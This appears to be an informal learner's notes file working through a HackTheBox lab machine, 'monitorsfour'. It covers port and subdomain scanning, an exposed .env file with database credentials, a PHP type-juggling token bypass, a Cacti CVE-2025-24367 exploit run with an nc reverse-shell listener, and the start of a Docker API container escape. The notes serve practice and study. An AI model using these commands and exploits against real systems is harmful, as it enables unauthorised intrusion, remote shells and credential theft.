new idea.

store ip in `./IP` so we don't keep embedding it everywhere. no more stale data, yaya!!!!

also. sick of being a script kiddie, let's try a fresh box with no solution yet. seasonal.

```bash
nmap $(cat ./IP) -sS -sV -p-

rustscan -a $(cat ./IP) -- 

# sudo su first.
export IP=$(cat ./IP)
echo  "$IP monitorsfour.htb" >> /etc/hosts

```

rustscan is a bit faster.

2 ports open:
- 80 http
- 5985 wsman (some powershell remote mgmt tool? idk)

need to edit /etc/hosts. i remembered!!!

    http://monitorsfour.htb/login

    POST http://monitorsfour.htb/api/v1/auth
    BODY www-urlencoded

    http://monitorsfour.htb/static/admin/assets/js/core/app.js
    nope. boring. nothing cool in client side JS.

    hm. let's poke tcp packets at 5985.

    weird!!! why is it replying with...a different web server?

    http://monitorsfour.htb:5985/

    let's...dirb?

    wait. ooh. http://monitorsfour.htb/forgot-password

    reset password.

    useful data?

    sales@monitorsfour.htb
    
    <span class="review-name">Nicola Johnson</span>
    <span class="review-desig">(IT Manager, TechCorp)</span>

    <span class="review-name">Glenn Jones</span>
    <span class="review-desig">(CEO, BizSolutions)</span>


okay. cheaty cheaty.
initially, tool use is totally different..

https://medium.com/@Root_Fabric/hackthebox-monitorsfour-4859add0b51c

    whatweb monitorsfour.htb
    nikto -h monitorsfour.htb

so, also `caido` seems to suck less that burp suite. not sure. it's newer, anyways.


not sure how this dude, `@Root_Fabric`, has found out how the `.env` file was exposed. guessing??

he also uses `ffuf`...

yeah. no shame. I just need to get this stuff down to muscle memory.
wow. `nikto` takes a long time.
yep. `.env` exists. it has creds, yay.

    ffuf -u http://monitorsfour.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403,404

cool. `ffuf`, `nikto`, and `whatweb` are really useful for web apps.


http://monitorsfour.htb/api/v1/auth

so, just try those creds.

DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r


apparently CVE-2024–42179 affects our non-standard port. `nmap $(cat ./IP) -sS -sV -p-` was not good enough, I think. oh, wait, no, it was fine..

Our author just happens to know this about Microsoft HTTPAPI httpd 2.0, that it's vulnerable.

so, on to metasploit, i guess. `msfconsole`

OK! nevermind. from the guide, our wonderful hacker friend decides to do a subdomain enum next.

    ffuf -c -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fw 3

subdomain get.

"cacti.monitorsfour.htb"
don't forget to edit /etc/hosts.

Version 1.2.28 | (c) 2004-2026 - The Cacti Group

https://www.cvedetails.com/version/1907377/Cacti-Cacti-1.2.28.html

https://www.cvedetails.com/cve/CVE-2025-24367/

exploit/linux/http/cacti_unauthenticated_cmd_injection

apparently we can exploit "type juggling" to...do something.

    curl http://monitorsfour.htb/user?token=AAAA

    curl http://monitorsfour.htb/user

we can use this to steal tokens, combined with this fact from PHP:

    Specific “Magic Hashes” (strings starting with `0e` followed by numbers) are treated as scientific notation (float) `0` by PHP during loose comparison.

let's try some of this on our own without peeking.

well. i have no clue why it worked, but we're further along.

    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "password_": "wonderful1"


http://monitorsfour.htb/admin/api

neat. api key gen. wonder what we can use it for.

http://monitorsfour.htb/admin/changelog


useful. changelog.

so.

cacti login is 

    marcus
    wonderful1
    
the admin's name is marcus.

okay.

so apparently CVE-2025–24367 gives us RCE if we're authenticated.

https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

```bash
export ATTACKER_IP=10.10.14.175
nc -nvlp 4444

python CVE-2025–24367.py -u 'marcus' -p 'wonderful1' -i $ATTACKER_IP -l 4444 --url 'http://cacti.monitorsfour.htb'
```

hooray!! we have a shell. it sucks a bit, but, it's a shell!!

I'm going to ask z.ai what I should do next. user flag gotten!!

dang. z.ai is smart.

so i told it we have a crappy shell, but A SHELL is still useful than NO SHELL

(so no shell? (sounds of incredible muffled violence))

getting root inside the docker container is probably a waste of our time? not sure.

    Exploiting Docker Engine API
    The Docker Engine API was accessible at http://192.168.65.7:2375. A new privileged container was created with host filesystem access to escape to the host.

no way I was going to get this on my own, but, it's okay. I'm still learning.

okay.

## escaping a WSL docker container to the host

### 1. find the host IP.
    
    cat /etc/resolv.conf
    
### 2. make sure the docker API is accessible.

    curl http://192.168.65.7:2375/version

    curl -s http://192.168.65.7:2375/images/json
